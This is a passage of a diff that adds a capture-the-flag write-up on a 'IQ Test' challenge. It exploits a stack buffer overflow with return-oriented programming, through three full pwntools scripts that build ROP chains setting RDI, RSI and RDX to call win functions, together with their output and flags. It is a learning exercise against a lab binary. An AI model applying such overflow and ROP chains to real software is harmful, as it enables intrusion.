@@ -160,3 +160,200 @@ This challenge did take a long time as I was out of touch with the tools. Regard
 - https://drive.google.com/drive/u/1/folders/1nc2RX2paLHo8lKn7lF0ox0HXmqpEW9-A?ths=true
 - https://www.sourceware.org/gdb/documentation/
 ----------------------------------------------------------------------------------------------------------------------------------
+## Property in Manipal
+
+----------------------------------------------------------------------------------------------------------------------------------
+## IQ Test
+This challenge was pretty lengthy, because of the multiple flags, and also shifting from simple buffer overflow to Return Oriented Programming.
+
+### Solution
+To solve this challenge, I followed the steps as below: 
+- I first read through the main function of the debugged code to understand where the vulnerability was. I found it in the line where we could write upto 512 bytes (`0x200`). This line is as below:
+`fgets(local_98,0x200,stdin);`
+- After this, I analyzed the file more in depth to learn that the buffer was located at `RBP - 0x98`. This was 152 bytes. So by writing more than 152 bytes, we were overflowing the buffer and overwriting the saved RBP, along with over writing the Return Address.
+- Before we actually went ahead and did any of that, we had to solve a quiz first. This quiz actually was to test whether we understood how functions in linux talked to each other or not.
+- After solving this quiz, we got an output which told us that we had passed the quiz, but we must move to the address to get the flag. The address was `0x401401`. Using this, we were able to clear the first level and move on. The script for this is as below:
+```bash
+from pwn import *
+
+context.binary = elf = ELF('./chall')
+p = remote("iqtest.nitephase.live", 51823)
+
+log.info("Answering the Quiz...")
+p.sendlineafter(b'> ', b'2') # Q1: False
+p.sendlineafter(b'> ', b'1') # Q2: RDI
+p.sendlineafter(b'> ', b'4') # Q3: RAX
+
+win1_addr = elf.symbols['win1']
+ret_gadget = ROP(elf).find_gadget(['ret'])[0] # Align stack
+
+payload = flat(
+    b'A' * 152,      # Padding
+    ret_gadget,      # Stack Alignment
+    win1_addr        # Jump to win1
+)
+
+log.info("Sending payload for Win1...")
+p.sendline(payload)
+print(p.recvall(timeout=3).decode(errors='ignore'))
+```
+- An important part here was the `ret_gadget`. This helped us in preventing the `movaps` crashes that might take place if it is not 16-bit aligned.
+- We got the output as shown below:
+```bash
+ ⚙  Sat  6 Dec - 15:31  ~/Downloads/src 
+ @ishaan-mishra  python3 win1.py
+[*] '/home/ishaan-mishra/Downloads/src/chall'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX unknown - GNU_STACK missing
+    PIE:      No PIE (0x400000)
+    Stack:    Executable
+    RWX:      Has RWX segments
+[+] Opening connection to iqtest.nitephase.live on port 51823: Done
+[*] Answering the Quiz...
+[*] Loaded 16 cached gadgets for './chall'
+[*] Sending payload for Win1...
+[+] Receiving all data: Done (493B)
+[*] Closed connection to iqtest.nitephase.live port 51823
+Correct!
+You may have passed my test but I must see you display your knowledge before you can access my secrets
+Lesson 1: For your first challenge you have to simply jump to the function at this address: 0x401401
+You have passed the first challenge. The next one won't be so simple.
+Lesson 2 Arguments: Research how arguments are passed to functions and apply your learning. Bring the artifact of 0xDEADBEEF to the temple of 0x401314 to claim your advance.nite{d1d_1_g3t_th3_fl4g?}
+Continue: 
+```
+- After doing this, we moved onto the next Lesson, which told us that we must take an artifact of `0xDEADBEEF` to the address given to us. What this meant was we needed to ensure that the value fed into an argument was what we wanted. So I read the binary a bit and discoverd the `win2` function. Now here the `win2` function took an arugment, and we used a gadget to overwrite the register that would be accessed and compared.
+- A gadget is basically mix and match that we make of pre-existing code already. We do this because our shellcode might be blocked, but the pre-written code is going to work just fine. 
+- On doing this, we were able to rewrite the `RDI` register. This allowed us to meet the criteria of `win2`. Script for it is as below:
+```bash
+from pwn import *
+
+context.binary = elf = ELF('./chall')
+p = remote("iqtest.nitephase.live", 51823)
+
+log.info("Answering the Quiz...")
+p.sendlineafter(b'> ', b'2') # Q1: False
+p.sendlineafter(b'> ', b'1') # Q2: RDI
+p.sendlineafter(b'> ', b'4') # Q3: RAX
+
+rop = ROP(elf)
+pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
+ret_gadget = rop.find_gadget(['ret'])[0]
+win2_addr = elf.symbols['win2']
+
+payload = flat(
+    b'A' * 152,      # Padding
+    ret_gadget,      # Stack Alignment
+    pop_rdi, 
+    0xdeadbeef,      # Argument 1
+    win2_addr        # Jump to win2
+)
+
+log.info("Sending payload for Win2...")
+p.sendline(payload)
+print(p.recvall(timeout=3).decode(errors='ignore'))
+```
+- A sneaky thing here was that since `win2` did not check whether `win1` was successful or not, we could skip it entirely and move onto `win2`. The output of the script is as shown below:
+```bash
+ ⚙  Sat  6 Dec - 15:09  ~/Downloads/src 
+ @ishaan-mishra  python3 win2.py
+[*] '/home/ishaan-mishra/Downloads/src/chall'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX unknown - GNU_STACK missing
+    PIE:      No PIE (0x400000)
+    Stack:    Executable
+    RWX:      Has RWX segments
+[+] Opening connection to iqtest.nitephase.live on port 51823: Done
+[*] Answering the Quiz...
+[*] Loaded 16 cached gadgets for './chall'
+[*] Sending payload for Win2...
+[+] Receiving all data: Done (473B)
+[*] Closed connection to iqtest.nitephase.live port 51823
+Correct!
+You may have passed my test but I must see you display your knowledge before you can access my secrets
+Lesson 1: For your first challenge you have to simply jump to the function at this address: 0x401401
+You have done well, however you still have one final test. You must now bring 3 artifacts of [0xDEADBEEF] [0xDEAFFACE] and [0xFEEDCAFE]. You must venture out and find the temple yourself. I believe in you
+nite{1_th1nk_1_f1n4lly_g0t_my_fl4g_n0w;)}
+Final Test: 
+```
+- Here I discovered the last and final level of this. We needed to get 3 arguments to the final function and have them overwritten with correct values to get the flag.
+- We found the address of `win3` function and then used gadgets again to populate the registers which would be accessed. We then called the `win3` function to finally get the correct flag. The script is as below:
+```bash
+from pwn import *
+
+context.binary = elf = ELF('./chall')
+p = remote("iqtest.nitephase.live", 51823)
+
+log.info("Answering the Quiz...")
+p.sendlineafter(b'> ', b'2') # Q1: False
+p.sendlineafter(b'> ', b'1') # Q2: RDI
+p.sendlineafter(b'> ', b'4') # Q3: RAX
+
+rop = ROP(elf)
+pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
+pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
+pop_rdx = rop.find_gadget(['pop rdx', 'ret'])[0]
+ret_gadget = rop.find_gadget(['ret'])[0]
+win3_addr = elf.symbols['win3']
+
+# RDI = 0xDEADBEEF
+# RSI = 0xDEAFFACE
+# RDX = 0xFEEDCAFE
+payload = flat(
+    b'A' * 152,          # Padding
+    ret_gadget,          # Stack Alignment
+    
+    pop_rdi, 0xdeadbeef, # Arg 1
+    pop_rsi, 0xdeafface, # Arg 2
+    pop_rdx, 0xfeedcafe, # Arg 3
+    
+    win3_addr            # Jump to win3
+)
+
+log.info("Sending payload for Win3...")
+p.sendline(payload)
+print(p.recvall(timeout=3).decode(errors='ignore'))
+```
+- The output for this is as follow:
+```bash
+ ⚙  Sat  6 Dec - 15:10  ~/Downloads/src 
+ @ishaan-mishra  python3 win3.py  
+[*] '/home/ishaan-mishra/Downloads/src/chall'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX unknown - GNU_STACK missing
+    PIE:      No PIE (0x400000)
+    Stack:    Executable
+    RWX:      Has RWX segments
+[+] Opening connection to iqtest.nitephase.live on port 51823: Done
+[*] Answering the Quiz...
+[*] Loaded 16 cached gadgets for './chall'
+[*] Sending payload for Win3...
+[+] Receiving all data: Done (312B)
+[*] Closed connection to iqtest.nitephase.live port 51823
+Correct!
+You may have passed my test but I must see you display your knowledge before you can access my secrets
+Lesson 1: For your first challenge you have to simply jump to the function at this address: 0x401401
+Congratulations. You are deserving of you reward
+
+nite{1m_th3_r34l_fl4g_blud_4l50_6-1_1s_m0r3_tuf}
+```
+
+### Flag 
+` nite{1m_th3_r34l_fl4g_blud_4l50_6-1_1s_m0r3_tuf}`
+
+### What I learned 
+I learned a lot more about Registers and Pointers in this challenge. The arguments overriding helped clarify the concepts of gadgets to me, because I was not really sure what they are. 
+
+### Notes
+I went on a whole lot of tangents in this, because I was not sure how the program was built, but eventually following each thread to where it led, I figured out how the program was built and how to solve it. 
+
+### References
+- https://drive.google.com/drive/u/1/folders/1rfX-CpK02zU9whAJl1Na6EeylZW9MJ6I?ths=true
+- https://r1ru.github.io/categories/binary-exploitation-101
+- Misc Google Searches for Gadgets and Scripts
+----------------------------------------------------------------------------------------------------------------------------------
